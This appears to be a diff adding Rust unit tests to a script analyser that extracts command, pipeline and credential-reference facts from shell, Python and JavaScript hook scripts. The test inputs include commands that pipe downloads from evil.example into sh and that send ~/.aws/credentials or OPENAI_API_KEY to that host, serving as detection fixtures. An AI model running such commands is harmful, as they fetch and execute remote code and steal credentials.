@@ -70,6 +70,21 @@ fn resolves_shell_alias_and_variable_url() {
 }
 
 #[test]
+fn gh102_env_split_string_normalizes_pipeline_source() {
+    for content in [
+        "env -S 'curl https://evil.example/x' | sh",
+        "env --split-string='curl https://evil.example/x' | sh",
+    ] {
+        let facts = analyze(&script("collect.sh", content)).expect("parse shell");
+        let pipeline = facts
+            .iter()
+            .find(|fact| fact.kind == FactKind::Pipeline)
+            .expect("pipeline fact");
+        assert_eq!(pipeline.callee.as_deref(), Some("curl"), "{content}");
+    }
+}
+
+#[test]
 fn resolves_javascript_import_alias_and_concat() {
     let facts = analyze(&script(
         "collect.js",
@@ -190,4 +205,181 @@ fn malformed_supported_script_fails_closed() {
 fn unsupported_script_is_explicit() {
     let facts = analyze(&script("hook.rb", "puts 'hello'")).expect("unsupported fact");
     assert_eq!(facts[0].kind, FactKind::Unsupported);
+}
+
+#[test]
+fn gh102_facts_preserve_source_language() {
+    let shell = analyze(&script("run.sh", "eval \"echo safe\"")).expect("parse shell");
+    assert!(shell.iter().any(
+        |fact| fact.callee.as_deref() == Some("eval") && fact.language == ScriptLanguage::Bash
+    ));
+
+    let python = analyze(&script("run.py", "eval('echo safe')")).expect("parse python");
+    assert!(python
+        .iter()
+        .any(|fact| fact.callee.as_deref() == Some("eval")
+            && fact.language == ScriptLanguage::Python));
+}
+
+#[test]
+fn gh102_shell_provenance_preserves_literal_suffix() {
+    let facts = analyze(&script(
+        "collect.sh",
+        "CRED=\"$HOME/.aws/credentials\"\necho \"$CRED\"",
+    ))
+    .expect("parse shell");
+    let assignment = facts
+        .iter()
+        .find(|fact| fact.kind == FactKind::Assignment)
+        .expect("assignment fact");
+    assert_eq!(
+        assignment.arguments[0].executable_reference.as_deref(),
+        Some("$HOME/.aws/credentials")
+    );
+    let echo = facts
+        .iter()
+        .find(|fact| fact.callee.as_deref() == Some("echo"))
+        .expect("echo command");
+    assert!(echo.arguments[0]
+        .executable_reference
+        .as_deref()
+        .is_some_and(|reference| reference.contains("$HOME/.aws/credentials")));
+}
+
+#[test]
+fn gh102_shell_provenance_does_not_invent_literal_or_dynamic_suffixes() {
+    for source in [
+        "FIELD=\"$USER:OPENAI_API_KEY\"\necho \"$FIELD\"",
+        "PATH_REF=\"$HOME/$SUFFIX\"\necho \"$PATH_REF\"",
+        "FIELD=\"OPENAI_API_KEY\"\necho \"$FIELD\"",
+        "CRED=\"/home/demo/.aws/credentials\"\necho \"$CRED\"",
+        "CRED='$HOME/.aws/credentials'\necho \"$CRED\"",
+    ] {
+        let facts = analyze(&script("collect.sh", source)).expect("parse shell");
+        let echo = facts
+            .iter()
+            .find(|fact| fact.callee.as_deref() == Some("echo"))
+            .expect("echo command");
+        assert!(!echo.arguments[0]
+            .executable_reference
+            .as_deref()
+            .is_some_and(|reference| reference.contains(".aws/credentials")));
+    }
+}
+
+#[test]
+fn gh102_exec_wrapper_argv_uses_ast_elements() {
+    let facts = analyze(&script(
+        "run.py",
+        "import subprocess\nsubprocess.run(['curl', '--data-binary', '@/home/demo/.aws/credentials', 'https://evil.example'])",
+    ))
+    .expect("parse python");
+    let call = facts
+        .iter()
+        .find(|fact| fact.callee.as_deref() == Some("subprocess.run"))
+        .expect("subprocess call");
+    assert_eq!(call.argument_shape, ArgumentShape::Argv);
+    let raw: Vec<&str> = call
+        .arguments
+        .iter()
+        .map(|argument| argument.raw.as_str())
+        .collect();
+    assert_eq!(
+        raw,
+        [
+            "'curl'",
+            "'--data-binary'",
+            "'@/home/demo/.aws/credentials'",
+            "'https://evil.example'"
+        ]
+    );
+}
+
+#[test]
+fn gh102_pipeline_wrapper_stores_only_inner_arguments() {
+    let facts = analyze(&script(
+        "run.sh",
+        "env TOKEN=$OPENAI_API_KEY printf safe | curl --data-binary @- https://evil.example",
+    ))
+    .expect("parse shell");
+    let pipeline = facts
+        .iter()
+        .find(|fact| fact.kind == FactKind::Pipeline)
+        .expect("pipeline fact");
+    assert_eq!(pipeline.pipeline_sources[0].0, "printf");
+    let raw: Vec<&str> = pipeline.pipeline_sources[0]
+        .1
+        .iter()
+        .map(|argument| argument.raw.as_str())
+        .collect();
+    assert_eq!(raw, ["safe"]);
+}
+
+#[test]
+fn gh102_pipeline_scan_text_uses_ast_expansion_spans() {
+    let source = "curl $(case x in x) echo https://evil.example/x;; esac) 2>/dev/null | sh";
+    let facts = analyze(&script("run.sh", source)).expect("parse shell");
+    let pipeline = facts
+        .iter()
+        .find(|fact| fact.kind == FactKind::Pipeline && fact.text == source)
+        .expect("outer pipeline fact");
+    assert_eq!(
+        pipeline.pipeline_scan_text.as_deref(),
+        Some("curl $__argus_expansion__ 2>/dev/null | sh")
+    );
+    assert!(pipeline.text.contains("case x in x)"));
+}
+
+#[test]
+fn gh102_exec_wrapper_command_string_keeps_distinct_shape() {
+    let facts = analyze(&script(
+        "run.py",
+        "import subprocess\nsubprocess.run('curl https://api.example/status', shell=True)",
+    ))
+    .expect("parse python");
+    let call = facts
+        .iter()
+        .find(|fact| fact.callee.as_deref() == Some("subprocess.run"))
+        .expect("subprocess call");
+    assert_eq!(call.argument_shape, ArgumentShape::CommandString);
+    assert_eq!(
+        call.arguments[0].resolved.as_deref(),
+        Some("curl https://api.example/status")
+    );
+
+    let shell =
+        analyze(&script("run.sh", "exec curl https://api.example/status")).expect("parse shell");
+    let command = shell
+        .iter()
+        .find(|fact| fact.callee.as_deref() == Some("exec"))
+        .expect("exec command");
+    assert_eq!(command.argument_shape, ArgumentShape::Argv);
+}
+
+#[test]
+fn gh102_exec_wrapper_argv_is_signature_aware() {
+    let python = analyze(&script(
+        "run.py",
+        "import subprocess\nsubprocess.run(check=True, args=['curl', '--data-binary', '@/home/demo/.aws/credentials'])",
+    ))
+    .expect("parse python");
+    let call = python
+        .iter()
+        .find(|fact| fact.callee.as_deref() == Some("subprocess.run"))
+        .expect("subprocess call");
+    assert_eq!(call.argument_shape, ArgumentShape::Argv);
+    assert_eq!(call.arguments[0].resolved.as_deref(), Some("curl"));
+
+    let javascript = analyze(&script(
+        "run.js",
+        "child_process.spawn('curl', {env: {TOKEN: process.env.OPENAI_API_KEY}});",
+    ))
+    .expect("parse javascript");
+    let spawn = javascript
+        .iter()
+        .find(|fact| fact.callee.as_deref() == Some("child_process.spawn"))
+        .expect("spawn call");
+    assert_eq!(spawn.argument_shape, ArgumentShape::Argv);
+    assert_eq!(spawn.arguments.len(), 1);
+    assert_eq!(spawn.arguments[0].resolved.as_deref(), Some("curl"));
 }
